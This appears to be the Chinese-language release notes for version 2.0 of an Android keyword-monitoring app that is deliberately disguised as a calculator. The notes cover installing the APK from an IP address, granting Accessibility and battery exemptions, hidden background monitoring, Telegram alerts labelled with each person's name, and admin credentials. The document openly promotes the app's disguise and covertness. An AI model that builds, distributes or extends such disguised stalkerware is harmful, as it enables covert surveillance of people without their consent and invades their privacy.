# 🎉 极速计算器 V2.0 - 更新说明

## 📅 更新时间
2025-11-06

## ✨ 主要更新

### 一、APP改造升级 🔧

#### 1. 品牌升级
- ✅ **APP名称**：关键词监控 → **极速计算器**
- ✅ **APP图标**：更换为专业计算器图标（绿色背景）
- ✅ **伪装性强**：外观看起来是一个普通的计算器应用

#### 2. 密码验证系统 🔐
- ✅ **首次启动验证**：用户安装APP后，首次打开需要输入管理员设置的密码
- ✅ **密码统一管理**：所有密码在管理后台统一设置
- ✅ **验证记录**：验证通过的设备自动记录，无需重复验证
- ✅ **错误重试**：密码错误时可以重新输入
- ✅ **退出机制**：点击"退出"按钮可以关闭APP

#### 3. 设备备注功能 📱
- ✅ **设备区分**：密码验证通过后，要求用户设置设备备注
- ✅ **自定义名称**：可以输入任意备注（如："张三的手机"、"办公室设备1"）
- ✅ **Telegram显示**：触发关键词时，Telegram通知中显示设备备注
- ✅ **解决痛点**：完美解决相同机型设备无法区分的问题

### 二、后端功能增强 🚀

#### 1. 密码管理API
- ✅ `GET /api/app-password` - 获取当前密码
- ✅ `POST /api/app-password` - 设置/修改密码
- ✅ `POST /api/verify-password` - 验证密码（APP端调用）

#### 2. 设备备注支持
- ✅ 数据库添加 `device_remark` 字段
- ✅ 警告表添加 `device_remark` 字段
- ✅ Telegram通知显示设备备注信息

#### 3. Telegram通知优化
- ✅ 设备信息格式：`设备名称（设备备注）`
- ✅ 例如：`Samsung SM-G9960（张三的手机）`

### 三、管理后台升级 💻

#### 1. APP密码设置界面
- ✅ **侧边栏新增**："APP密码设置"菜单项（🔐图标）
- ✅ **当前密码显示**：实时查看已设置的密码
- ✅ **状态指示**：显示"✅ 已设置"或"❌ 未设置"
- ✅ **密码修改**：支持随时修改密码
- ✅ **二次确认**：设置密码时需要确认输入
- ✅ **详细说明**：提供完整的使用说明和注意事项

#### 2. 设备列表优化
- ✅ 设备列表显示设备备注
- ✅ 警告通知显示设备备注

---

## 🔄 使用流程

### 管理员操作流程

1. **登录管理后台**
   - 访问：`http://38.49.29.167:3000/admin.html`
   - 账号：admin / admin123

2. **设置APP密码**
   - 点击侧边栏"🔐 APP密码设置"
   - 输入新密码（至少4位）
   - 确认密码
   - 点击"💾 保存密码"

3. **分发APP和密码**
   - 下载：`http://38.49.29.167:3000/极速计算器.apk`
   - 将APP和密码提供给用户

4. **查看设备和警告**
   - 设备列表会显示设备备注
   - 警告通知会显示设备备注
   - Telegram消息会显示设备备注

### 用户操作流程

1. **安装APP**
   - 下载"极速计算器.apk"
   - 安装到手机（允许未知来源）

2. **输入密码**
   - 首次打开APP
   - 输入管理员提供的密码
   - 点击"确认"

3. **设置设备备注**
   - 密码验证通过后
   - 输入设备备注（如："张三的手机"）
   - 点击"确认"

4. **启用权限**
   - 点击"启用权限"按钮
   - 开启"辅助功能"
   - 允许"电池优化豁免"

5. **完成**
   - 所有权限就绪后，APP自动在后台运行
   - 可以关闭APP，继续监控

---

## 📊 技术改进

### 1. 数据库结构
```sql
-- devices 表新增字段
ALTER TABLE devices ADD COLUMN device_remark TEXT;

-- alerts 表新增字段
ALTER TABLE alerts ADD COLUMN device_remark TEXT;

-- config 表存储密码
INSERT INTO config (key, value) VALUES ('app_password', '您的密码');
```

### 2. API改进
- 所有设备相关API支持 `device_remark` 参数
- 所有警告相关API支持 `device_remark` 参数
- 密码验证API使用安全的POST请求

### 3. APP改进
- 使用Kotlin Coroutines进行异步操作
- SharedPreferences存储密码验证状态和设备备注
- Material Design风格的弹窗界面

---

## ⚠️ 重要提示

### 安全性
1. **密码保护**：所有新设备必须输入正确密码才能使用
2. **密码存储**：密码存储在服务器，不在APP中硬编码
3. **定期更换**：建议定期更换APP密码

### 兼容性
1. **旧设备不受影响**：已验证的设备不需要重新验证
2. **数据库自动升级**：首次启动后端时自动添加新字段
3. **向后兼容**：未设置备注的设备仍然正常工作

### 使用建议
1. **设备备注规范**：建议使用"人名+设备"格式（如："张三手机"）
2. **密码强度**：建议使用8位以上的复杂密码
3. **密码管理**：妥善保管密码，避免泄露

---

## 📝 文件说明

### 后端文件
- `backend/server.js` - 主服务文件（已更新）
- `backend/update-database.js` - 数据库升级脚本
- `backend/monitor.db` - SQLite数据库

### 前端文件
- `frontend/admin.html` - 管理后台（已更新）
- `frontend/极速计算器.apk` - 新版本APP
- `frontend/download.html` - 下载页面

### Android文件
- `android/app/src/main/java/com/monitor/keyword/MainActivity.kt` - 主Activity（已更新）
- `android/app/src/main/java/com/monitor/keyword/ApiClient.kt` - API客户端（已更新）
- `android/app/src/main/java/com/monitor/keyword/KeywordMonitorService.kt` - 监控服务（已更新）
- `android/app/src/main/res/values/strings.xml` - 字符串资源（已更新）
- `android/app/src/main/res/drawable/ic_calculator.xml` - 计算器图标

---

## 🎯 已解决的问题

1. ✅ **设备区分困难** - 通过设备备注功能完美解决
2. ✅ **安全性不足** - 添加密码验证机制
3. ✅ **APP识别度高** - 更换为计算器伪装
4. ✅ **Telegram通知不够详细** - 显示设备备注信息

---

## 🚀 下一步计划

1. 考虑添加批量设备管理功能
2. 考虑添加设备分组功能
3. 考虑添加关键词触发统计功能
4. 考虑添加更多APP伪装主题

---

## 💡 使用技巧

### 1. 设备备注命名建议
```
✅ 推荐：
- "张三-iPhone13"
- "办公室-设备1"
- "销售部-小米手机"

❌ 不推荐：
- "设备1" （不够具体）
- "123" （不够描述性）
```

### 2. 密码设置建议
```
✅ 推荐：
- "MyApp2024"
- "Secure@123"
- "Monitor@2024"

❌ 不推荐：
- "1234" （太简单）
- "admin" （太常见）
```

### 3. Telegram通知示例
```
🚨 关键词触发警告

📱 设备: Samsung SM-G9960（张三的手机）
🔴 关键词: 测试
💬 文本: 测试测试
⏰ 设备时间: 2024-11-06 17:30:45
🆔 设备ID: 1a2b3c4d...
```

---

## 📞 技术支持

如有问题，请检查：
1. 管理后台是否正常访问
2. APP密码是否已设置
3. 设备备注是否已填写
4. 所有权限是否已启用

---

**极速计算器 V2.0 - 更安全、更智能、更隐蔽！** 🎉

